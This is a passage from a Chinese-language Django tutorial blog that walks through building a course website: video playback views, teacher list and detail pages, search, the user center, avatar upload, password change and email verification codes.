all_user_course in all_user_courses]</span><br><span class="line">        # 获取学过该课程用户学过的其他课程</span><br><span class="line">        relate_courses &#x3D; Course.objects.filter(id__in&#x3D;course_ids).order_by(&quot;-click_nums&quot;)[:5]</span><br><span class="line">        # 是否收藏课程</span><br><span class="line">        return render(request, &quot;course-video.html&quot;, &#123;</span><br><span class="line">            &quot;course&quot;: course,</span><br><span class="line">            &quot;all_resources&quot;: all_resources,</span><br><span class="line">            &quot;relate_courses&quot;:relate_courses,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>重点: 两个下划线代表我传进来的是一个list，你进行遍历。</p></blockquote><p>comments也做同样处理</p><p>用户未登录，不要让他能点进view</p><p>如果使用的是方法型编程可以使用装饰器<code>loginrequired</code></p><p>而我们使用的是类。所以要继承。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.auth.mixins import LoginRequiredMixin</span><br><span class="line">class CourseInfoView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;redirect_to&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="课程播放页面"><a href="#课程播放页面" class="headerlink" title="课程播放页面"></a>课程播放页面</h2><p>将视频播放页面拷贝到template目录</p><p>使用开源库video js</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9ea5479f0e8165a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/141" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-7743fd38993082ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/125" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-b9607b955ad7075c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/520" alt="img"></p><p>添加访问的url和view；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程视频播放页</span><br><span class="line">url(r&#39;^video&#x2F;(?P&lt;video_id&gt;\d+)&#x2F;$&#39;, VideoPlayView.as_view(), name&#x3D;&quot;video_play&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 播放视频的view</span><br><span class="line">class VideoPlayView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line">    def get(self, request, video_id):</span><br><span class="line">        # 此处的id为表默认为我们添加的值。</span><br><span class="line">        video &#x3D; Video.objects.get(id&#x3D;int(video_id))</span><br><span class="line">        # 找到对应的course</span><br><span class="line">        course &#x3D; video.lesson.course</span><br><span class="line">        # 查询用户是否开始学习了该课，如果还未学习则，加入用户课程表</span><br><span class="line">        user_courses &#x3D; UserCourse.objects.filter(user&#x3D;request.user, course&#x3D;course)</span><br><span class="line">        if not user_courses:</span><br><span class="line">            user_course &#x3D; UserCourse(user&#x3D;request.user, course&#x3D;course)</span><br><span class="line">            user_course.save()</span><br><span class="line">        # 查询课程资源</span><br><span class="line">        all_resources &#x3D; CourseResource.objects.filter(course&#x3D;course)</span><br><span class="line">        # 选出学了这门课的学生关系</span><br><span class="line">        user_courses &#x3D; UserCourse.objects.filter(course&#x3D;course)</span><br><span class="line">        # 从关系中取出user_id</span><br><span class="line">        user_ids &#x3D; [user_course.user_id for user_course in user_courses]</span><br><span class="line">        # 这些用户学了的课程,外键会自动有id，取到字段</span><br><span class="line">        all_user_courses &#x3D; UserCourse.objects.filter(user_id__in&#x3D;user_ids)</span><br><span class="line">        # 取出所有课程id</span><br><span class="line">        course_ids &#x3D; [user_course.course_id for user_course in all_user_courses]</span><br><span class="line">        # 获取学过该课程用户学过的其他课程</span><br><span class="line">        relate_courses &#x3D; Course.objects.filter(id__in&#x3D;course_ids).order_by(&quot;-click_nums&quot;).exclude(id&#x3D;course.id)[:4]</span><br><span class="line">        # 是否收藏课程</span><br><span class="line">        return render(request, &quot;course-play.html&quot;, &#123;</span><br><span class="line">            &quot;course&quot;: course,</span><br><span class="line">            &quot;all_resources&quot;: all_resources,</span><br><span class="line">            &quot;relate_courses&quot;: relate_courses,</span><br><span class="line">            &quot;video&quot;: video,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>title 与面包屑的修改</p><h1 id="讲师相关功能实现"><a href="#讲师相关功能实现" class="headerlink" title="讲师相关功能实现"></a><center>讲师相关功能实现</center></h1><h2 id="讲师列表页"><a href="#讲师列表页" class="headerlink" title="讲师列表页"></a>讲师列表页</h2><p>teacherlist 和 teacher detail 一起放到template目录之下</p><p>继承base页面</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-e5db223afd96b52f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/306" alt="img"></p><h3 id="书写view与配置url"><a href="#书写view与配置url" class="headerlink" title="书写view与配置url"></a>书写view与配置url</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 讲师列表</span><br><span class="line">path(&#39;teacher_list&#x2F;&#39;, TeacherListView.as_view(), name&#x3D;&quot;teacher_list&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加讲师的年龄字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">age &#x3D; models.IntegerField(default&#x3D;18, verbose_name&#x3D;u&quot;年龄&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分页仿照orglist-注意object-list"><a href="#分页仿照orglist-注意object-list" class="headerlink" title="分页仿照orglist 注意object_list"></a>分页仿照orglist 注意object_list</h3><p>view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 课程讲师列表页</span><br><span class="line">class TeacherListView(View):</span><br><span class="line">        def get(self, request):</span><br><span class="line">            all_teacher &#x3D; Teacher.objects.all()</span><br><span class="line">            # 总共有多少老师使用count进行统计</span><br><span class="line">            teacher_nums &#x3D; all_teacher.count()</span><br><span class="line">            # 对讲师进行分页</span><br><span class="line">            # 尝试获取前台get请求传递过来的page参数</span><br><span class="line">            # 如果是不合法的配置参数默认返回第一页</span><br><span class="line">            try:</span><br><span class="line">                page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">            except PageNotAnInteger:</span><br><span class="line">                page &#x3D; 1</span><br><span class="line">            # 这里指从allorg中取五个出来，每页显示5个</span><br><span class="line">            p &#x3D; Paginator(all_teacher, 4, request&#x3D;request)</span><br><span class="line">            teachers &#x3D; p.page(page)</span><br><span class="line">            return render(request, &quot;teachers-list.html&quot;, &#123;</span><br><span class="line">            &quot;all_teacher&quot;:teachers,</span><br><span class="line">            &quot;teacher_nums&quot;:teacher_nums</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="排序-amp-讲师排行榜"><a href="#排序-amp-讲师排行榜" class="headerlink" title="排序 &amp; 讲师排行榜"></a>排序 &amp; 讲师排行榜</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sort &#x3D; request.GET.get(&quot;sort&quot;, &quot;&quot;)</span><br><span class="line">           if sort:</span><br><span class="line">               if sort &#x3D;&#x3D; &quot;hot&quot;:</span><br><span class="line">                   all_teacher &#x3D; all_teacher.order_by(&quot;-click_nums&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;sort&quot;:sort</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将sort return到前端。实现active</p><p>排行榜讲师</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 排行榜讲师</span><br><span class="line">rank_teacher &#x3D; Teacher.objects.all().order_by(&quot;-fav_nums&quot;)[:5]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-bd7a8603f7da3e4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/475" alt="img"></p><p>forloop.count 取出当前是第几次循环</p><h2 id="讲师详情页"><a href="#讲师详情页" class="headerlink" title="讲师详情页"></a>讲师详情页</h2><p><img src="https://upload-images.jianshu.io/upload_images/1779926-45db0547327267a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/285" alt="img"></p><p>mark</p><h3 id="配置url和view"><a href="#配置url和view" class="headerlink" title="配置url和view"></a>配置url和view</h3><p>列表页中配置入口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 教师详情页面</span><br><span class="line"></span><br><span class="line">class TeacherDetailView(View):</span><br><span class="line">    def get(self, request, teacher_id):</span><br><span class="line">        teacher &#x3D; Teacher.objects.get(id &#x3D; int(teacher_id))</span><br><span class="line">        all_course &#x3D; teacher.course_set.all()</span><br><span class="line">        # 排行榜讲师</span><br><span class="line">        rank_teacher &#x3D; Teacher.objects.all().order_by(&quot;-fav_nums&quot;)[:5]</span><br><span class="line"></span><br><span class="line">        has_fav_teacher &#x3D; False</span><br><span class="line">        if UserFavorite.objects.filter(user&#x3D;request.user, fav_type&#x3D;3, fav_id&#x3D; teacher.id):</span><br><span class="line">            has_fav_teacher &#x3D; True</span><br><span class="line">        has_fav_org &#x3D; False</span><br><span class="line">        if  UserFavorite.objects.filter(user&#x3D;request.user, fav_type&#x3D;2, fav_id&#x3D; teacher.org.id):</span><br><span class="line">            has_fav_org &#x3D; True</span><br><span class="line">        return render(request, &quot;teacher-detail.html&quot;, &#123;</span><br><span class="line">            &quot;teacher&quot;:teacher,</span><br><span class="line">            &quot;all_course&quot;:all_course,</span><br><span class="line">            &quot;rank_teacher&quot;:rank_teacher,</span><br><span class="line">            &quot;has_fav_teacher&quot;:has_fav_teacher,</span><br><span class="line">            &quot;has_fav_org&quot;:has_fav_org,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 访问机构讲师</span><br><span class="line">    re_path(&#39;teacher&#x2F;detail&#x2F;(?P&lt;teacher_id&gt;\d+)&#x2F;&#39;, TeacherDetailView.as_view(), name&#x3D;&quot;teacher_detail&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="全局导航-amp-个人中心-amp-全局搜索"><a href="#全局导航-amp-个人中心-amp-全局搜索" class="headerlink" title="全局导航&amp;个人中心&amp;全局搜索"></a><center>全局导航&amp;个人中心&amp;全局搜索</center></h1><h2 id="配置全局导航"><a href="#配置全局导航" class="headerlink" title="配置全局导航"></a>配置全局导航</h2><p>让index页面也继承base页面</p><p>base页面的导航栏配置</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-aecfdab8c06909fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/599" alt="img"></p><p>但是现在我们不知道当前是哪一个页面，因为后端没有传值过来</p><p>后台的每个view中添加current nav字段。然后向上传递到base页面</p><p>为了满足前台有current view的值，我们写的每个view都得加上这个字段。</p><p>小技巧：根据request的地址中的前几位来判断在哪一个区域之下</p><p>request.path</p><p>修改url中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 访问机构讲师</span><br><span class="line">url(r&#39;^org_teacher&#x2F;(?P&lt;org_id&gt;\d+)&#x2F;$&#39;, OrgTeacherView.as_view(), name&#x3D;&quot;org_teacher&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ad1b338cfe2ef8b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/500" alt="img"></p><h2 id="全局搜索功能开发"><a href="#全局搜索功能开发" class="headerlink" title="全局搜索功能开发"></a>全局搜索功能开发</h2><p>搜索跳到列表展示</p><p>courselist后加参数keywords</p><p>搜索的代码放在deco-common js中</p><p>课程的搜索功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 搜索功能</span><br><span class="line">search_keywords &#x3D; request.GET.get(&#39;keywords&#39;,&#39;&#39;)</span><br><span class="line">if search_keywords:</span><br><span class="line">    # 在name字段进行操作,做like语句的操作。i代表不区分大小写</span><br><span class="line">    # or操作使用Q</span><br><span class="line">    all_course &#x3D; all_course.filter(Q(name__icontains&#x3D;search_keywords)|Q(desc__icontains&#x3D;search_keywords)|Q(detail__icontains&#x3D;search_keywords))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;search_keywords&quot;:search_keywords,</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="个人中心信息展示"><a href="#个人中心信息展示" class="headerlink" title="个人中心信息展示"></a>个人中心信息展示</h2><p>将用户中心相关的六个页面，全部拷贝进template</p><p>新建usercenter base页面</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-224ecf2256279c96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>配置url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># user app的url配置</span><br><span class="line">url(r&quot;^users&#x2F;&quot;, include(&#39;users.urls&#39;, namespace&#x3D;&quot;users&quot;)),</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">from .views import UserInfoView</span><br><span class="line"></span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    # 用户信息</span><br><span class="line">    url(r&#39;^info&#x2F;$&#39;, UserInfoView.as_view(), name&#x3D;&quot;user_info&quot;),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 用户个人信息view</span><br><span class="line">class UserInfoView(LoginRequiredMixin,View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line">    def get(self, request):</span><br><span class="line">        return render(request, &quot;usercenter-info.html&quot;, &#123;</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>user app 下新建url</p><p>django自带的filter</p><p>request.user.mobile|default_if_none:’’</p><h2 id="修改密码和修改头像"><a href="#修改密码和修改头像" class="headerlink" title="修改密码和修改头像"></a>修改密码和修改头像</h2><p>新建url 和 view</p><p>小技巧:</p><blockquote><p>django的xadmin和admin当中，实际上是可以对form定义为文件的时候，是可以自动对上传的文件做保存的。<br>使用form的一个字段定义一个文件类型。把字段取出来就是内存中的文件。<br>赋值到user.image 就完成图片的一个存储。</p></blockquote><p>users/forms.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 用于文件上传，修改头像</span><br><span class="line">class UploadImageForm(forms.ModelForm):</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        model &#x3D; UserProfile</span><br><span class="line">        fields &#x3D; [&#39;image&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实例化时，传进来是post 和 文件类型的request 存放地址</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-98121b14dfe4925e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/392" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2b282e75b097eaf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/340" alt="img"></p><p>mark</p><p>上传文件时通过一个form完成的。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-9fe3ac2194c79af7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/221" alt="img"></p><p>必须指明enctype，才能把文件类型传递到后台</p><p>url 和view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 用户头像上传</span><br><span class="line">url(r&#39;^image&#x2F;upload&#x2F;$&#39;, UploadImageView.as_view(), name&#x3D;&quot;image_upload&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 用户上传图片的view:用于修改头像</span><br><span class="line">class UploadImageView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line">    def post(self, request):</span><br><span class="line">        # 这时候用户上传的文件就已经被保存到imageform了</span><br><span class="line">        image_form &#x3D; UploadImageForm(request.POST, request.FILES)</span><br><span class="line">        if image_form.is_valid():</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1ea10d80002ec1b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/507" alt="img"></p><p>这里的name必须和form中的一样</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-35c4e451ed148950.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/674" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-74740b8a8c7039c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/521" alt="img"></p><blockquote><p>所有验证通过的字段放在cleaned data</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 用户上传图片的view:用于修改头像</span><br><span class="line">class UploadImageView(LoginRequiredMixin, View):</span><br><span class="line">    login_url &#x3D; &#39;&#x2F;login&#x2F;&#39;</span><br><span class="line">    redirect_field_name &#x3D; &#39;next&#39;</span><br><span class="line">    def post(self, request):</span><br><span class="line">        # 这时候用户上传的文件就已经被保存到imageform了 ，为modelform添加instance值直接保存</span><br><span class="line">        image_form &#x3D; UploadImageForm(request.POST, request.FILES, instance&#x3D;request.user)</span><br><span class="line">        if image_form.is_valid():</span><br><span class="line">            image_form.save()</span><br><span class="line">            # # 取出cleaned data中的值,一个dict</span><br><span class="line">            # image &#x3D; image_form.cleaned_data[&#39;image&#39;]</span><br><span class="line">            # request.user.image &#x3D; image</span><br><span class="line">            # request.user.save()</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改密码功能:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 在个人中心修改用户密码</span><br><span class="line">class UpdatePwdView(View):</span><br><span class="line">    def post(self, request):</span><br><span class="line">        modiypwd_form &#x3D; ModifyPwdForm(request.POST)</span><br><span class="line">        if modiypwd_form.is_valid():</span><br><span class="line">            pwd1 &#x3D; request.POST.get(&quot;password1&quot;, &quot;&quot;)</span><br><span class="line">            pwd2 &#x3D; request.POST.get(&quot;password2&quot;, &quot;&quot;)</span><br><span class="line">            # 如果两次密码不相等，返回错误信息</span><br><span class="line">            if pwd1 !&#x3D; pwd2:</span><br><span class="line">                return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;密码不一致&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">            # 如果密码一致</span><br><span class="line">            user &#x3D;request.user</span><br><span class="line">            # 加密成密文</span><br><span class="line">            user.password &#x3D; make_password(pwd2)</span><br><span class="line">            # save保存到数据库</span><br><span class="line">            user.save()</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        # 验证失败说明密码位数不够。</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;填写错误请检查&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-91d82f714461fffa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/664" alt="img"></p><p>必须与我们的form中定义的一致</p><p>实现的js代码在deco-user.js</p><p>js文件中的url就一定不能用template的模板语言了</p><h2 id="修改邮箱提交form表单"><a href="#修改邮箱提交form表单" class="headerlink" title="修改邮箱提交form表单"></a>修改邮箱提交form表单</h2><p>有两个接口需要完成。点击获取验证码时，后台需要向用户新邮箱发送验证码。<br>邮箱如果出错，会返回错误信息。</p><p>输入了邮箱和验证码，验证是否匹配。</p><h3 id="获取验证码接口"><a href="#获取验证码接口" class="headerlink" title="获取验证码接口:"></a>获取验证码接口:</h3><p>配置url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 专用于发送验证码的</span><br><span class="line">url(r&#39;^sendemail_code&#x2F;$&#39;, SendEmailCodeView.as_view(), name&#x3D;&quot;sendemail_code&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新增邮箱验证码model类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEND_CHOICES &#x3D; (</span><br><span class="line">        (&quot;register&quot;, u&quot;注册&quot;),</span><br><span class="line">        (&quot;forget&quot;, u&quot;找回密码&quot;),</span><br><span class="line">        (&quot;update_email&quot;, u&quot;修改邮箱&quot;)</span><br><span class="line">    )</span><br><span class="line">           max_length&#x3D;20,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送邮箱验证码view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class SendEmailCodeView(LoginRequiredMixin, View):</span><br><span class="line">    def get(self,request):</span><br><span class="line">        # 取出需要发送的邮件</span><br><span class="line">        email &#x3D; request.GET.get(&quot;email&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">        # 不能是已注册的邮箱</span><br><span class="line">        if UserProfile.objects.filter(email&#x3D;email):</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;email&quot;:&quot;邮箱已经存在&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        send_register_eamil(email, &quot;update_email&quot;)</span><br><span class="line">        return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送邮箱验证码的功能放在deco-user.js中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">elif send_type &#x3D;&#x3D; &quot;update_email&quot;:</span><br><span class="line">    code &#x3D; random_str(4)</span><br><span class="line">    email_title &#x3D; &quot;mtianyan慕课小站 修改邮箱验证码&quot;</span><br><span class="line">    email_body &#x3D; loader.render_to_string(</span><br><span class="line">        &quot;email_update_email.html&quot;,  # 需要渲染的html模板</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;active_code&quot;: code  # 参数</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    msg &#x3D; EmailMessage(email_title, email_body, EMAIL_FROM, [email])</span><br><span class="line">    msg.content_subtype &#x3D; &quot;html&quot;</span><br><span class="line">    send_status &#x3D; msg.send()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改邮箱的view"><a href="#修改邮箱的view" class="headerlink" title="修改邮箱的view"></a>修改邮箱的view</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 修改邮箱的view:</span><br><span class="line">class 